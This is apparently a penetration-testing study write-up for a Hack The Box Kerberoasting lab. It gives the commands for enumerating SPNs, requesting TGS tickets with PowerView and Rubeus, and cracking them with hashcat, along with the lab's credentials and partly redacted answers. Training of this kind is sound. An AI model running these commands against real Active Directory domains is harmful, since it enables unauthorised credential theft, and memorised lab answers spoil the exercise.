### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Kerberoasting: from Windows <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Kerberoasting: from Windows

Several methods from a domain-joined Windows host: built-in `setspn.exe` + Mimikatz, PowerView, Rubeus.

Enumerate SPNs with built-in tooling:

```diff
+ C:\> setspn.exe -Q */*
```

<br>

Look for `user accounts` (CN under `OU=Service Accounts` / `OU=Users` etc.): ignore computer SPNs.

PowerView SPN enum:

```diff
+ PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

<br>

Targeted PowerView Kerberoast (request TGS + format for hashcat):

```diff
+ PS> $User = "INLANEFREIGHT\sqldev"
+ PS> Get-DomainUser -Identity $User | Get-DomainSPNTicket -Format Hashcat
```

<br>

Export to CSV for cracking:

```diff
+ PS> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\sqldev_tgs.csv -NoTypeInformation
```

<br>

Rubeus all-in-one:

```diff
+ PS> .\Rubeus.exe kerberoast /outfile:hashes.txt
+ PS> .\Rubeus.exe kerberoast /user:<USER> /nowrap
```

<br>

Crack:

```diff
+ $ hashcat -m 13100 sso_tgs.csv rockyou.txt
```

<br>

Note: hashcat doesn't like the CSV header: strip the column line and surrounding quotes before cracking.

<br>

---

<br>

### Kerberoasting from Windows Exercise

IP: 10.129.10.44

RDP `htb-student:Academy_student_AD!`.

---

### Question 1:
What is the name of the service account with the SPN 'vmware/inlanefreight.local'?

#### RDP in, import PowerView, query the LDAP filter for the SPN.

```diff
+ $ xfreerdp /v:10.129.10.44 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
+ PS> Import-Module .\PowerView.ps1
+ PS> $spn = "vmware/inlanefreight.local"
+ PS> $serviceAccount = Get-DomainObject -LDAPFilter "(servicePrincipalName=$spn)"
+ PS> $serviceAccount.samAccountName
```

	svc_vmwaresso

&#x1F6A9; found **svc_vmwa--edit--**.

---

### Question 2:
Crack the password for this account and submit it as your answer.

#### Re-RDP with /drive:share to ship the hash off, request TGS via PowerView, drag CSV into the share, strip CSV formatting, hashcat 13100.

```diff
+ $ mkdir share
+ $ xfreerdp /v:10.129.10.44 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /drive:share,/home/htb-ac-830862/share
+ PS> Import-Module .\PowerView.ps1
+ PS> Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\sso_tgs.csv -NoTypeInformation
+ $ hashcat -m 13100 sso_tgs.csv rockyou.txt
```

	$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*...:Virtual01

&#x1F6A9; found **Virtu--edit--01**.
